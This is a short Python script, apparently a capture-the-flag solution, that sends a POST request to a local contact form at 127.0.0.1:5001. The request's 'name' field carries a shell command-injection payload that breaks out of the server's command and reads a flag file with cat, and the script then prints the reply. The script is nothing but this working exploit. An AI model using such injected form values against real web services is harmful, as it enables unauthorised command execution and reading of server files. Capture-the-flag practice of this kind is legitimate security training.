#!/usr/bin/python3

import requests as re

data = {
	'name': '";cat /contact.flag;"',
	'advice': '1',
}
res = re.post('http://127.0.0.1:5001/contact', data=data)
print(res.content)